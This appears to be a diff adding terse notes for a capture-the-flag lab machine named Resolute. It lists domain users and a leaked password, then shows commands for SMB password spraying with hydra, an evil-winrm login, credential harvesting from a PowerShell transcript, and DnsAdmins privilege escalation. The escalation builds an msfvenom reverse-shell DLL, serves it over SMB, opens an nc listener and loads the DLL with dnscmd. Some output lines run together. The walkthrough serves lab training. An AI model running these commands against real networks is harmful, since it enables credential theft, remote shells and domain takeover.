@@ -1,0 +1,63 @@
+Domain: megabank.local
+Workgroup: MEGABANK
+NetBIOS: RESOLUTE
+
+Users:
+- Administrator
+- abigail
+- angela
+- annette
+- annika
+- claire
+- claude
+- felicia
+- fred
+- gustavo
+- krbtgt
+- marcus
+- marko (Password: Welcome123!)
+- melanie
+- naoki
+- paulo
+- per
+- ryan (Has name)
+- sally
+- simon
+- steve
+- stevie
+- sunita
+- ulf
+- zach
+
+root@parrot# evil-winrm -u marko -p 'Welcome123!' -i 10.10.10.169
+WinRM::WinRMAuthorizationError
+
+root@parrot# hydra -L loot/users.txt -p 'Welcome123!' 10.10.10.169 smb
+[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
+
+root@parrot# smbmap -u melanie -p 'Welcome123!' -H 10.10.10.169
+
+Disk             Permissions	Comment----             -----------	-------ADMIN$           NO ACCESS	Remote AdminC$               NO ACCESS	Default shareIPC$             READ ONLY	Remote IPCNETLOGON         READ ONLY	Logon server share SYSVOL           READ ONLY	Logon server share
+[-] Nothing there.
+
+root@parrot# evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169
+
+[!] Got user.txt!
+
+[!] Found C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:
+	> cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+root@parrot# evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
+<...>
+MEGABANK\DnsAdmins
+<...>
+
+[!] https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> echo $env:PROCESSOR_ARCHITECTUREAMD64limitedeternity$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 --platform=windows -f dll > plugin.dll
+limitedeternity$ sudo smbserver.py SHARE .
+limitedeternity$ nc -lvnp 4444
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.29\SHARE\plugin.dll ; sc.exe stop dns ; sc.exe start dns 
